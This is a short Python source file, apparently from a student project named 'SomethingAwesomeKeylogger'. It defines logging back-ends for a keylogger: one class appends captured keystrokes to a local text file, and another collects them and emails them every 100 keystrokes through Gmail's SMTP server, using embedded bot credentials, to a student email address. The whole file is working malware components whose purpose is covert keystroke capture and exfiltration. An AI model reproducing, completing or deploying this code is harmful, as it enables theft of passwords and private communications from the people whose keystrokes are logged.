# different ways of logging the keystrokes
class WriteToFile:
    def __init__(self, file="keystrokes.txt"):
        self.file = file

        # initialise new file
        with open(file, 'w'):
            pass

    def log(self, key):
        with open(self.file, 'a') as file:
            file.write(key + "\n")

class Email:
    def __init__(self, credentials=("SomethingAwesomeKeylogger", 'dummypassword123'),
                 destinationEmail="z5161179@student.unsw.edu.au"):

        self.destinationEmail = destinationEmail # email of where we are sending the logs
        self.credentials = credentials # login info of our bot
        self.keys = "KEYSTROKES:\n" # all stored keystrokes
        self.count = 0 # how many keystrokes.

    def log(self, key):
        self.keys += key + "," # add keystroke
        self.count += 1

        # send an email every 100 keystrokes
        if self.count%100 == 0:
            self.sendEmail()

    def sendEmail(self):
        # initialise the email account
        import smtplib
        with smtplib.SMTP('smtp.gmail.com', 587) as server: # setup email server
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(self.credentials[0], self.credentials[1])
            print('sending')
            server.sendmail(self.credentials[0], self.destinationEmail, self.keys)